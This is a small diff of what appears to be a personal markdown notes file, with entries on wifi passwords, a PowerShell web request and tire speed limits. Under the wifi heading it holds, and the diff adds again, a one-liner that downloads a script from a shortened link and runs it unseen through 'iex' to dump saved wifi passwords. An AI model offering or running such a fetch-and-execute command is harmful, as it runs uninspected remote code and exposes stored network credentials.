@@ -57,7 +57,7 @@ Invoke-WebRequest -Uri http://www.figma.com/figjam -Method Head
 [[Get all wifi password]]
 > **irm [https://tinyurl.com/GetListWifiPasswords](https://tinyurl.com/GetListWifiPasswords?fbclid=IwAR05MEDw97SVwJQ3TWmEp4yXOICs5vZ0_kl9DjFL4DAql2yjV18AQQiJyqo) | iex**
 
-
+> irm https://tinyurl.com/GetListWifiPasswords | iex**
 
 Tire Speed Limit 
 ![[432450160_795999162548007_2262674713157060908_n.jpg]]
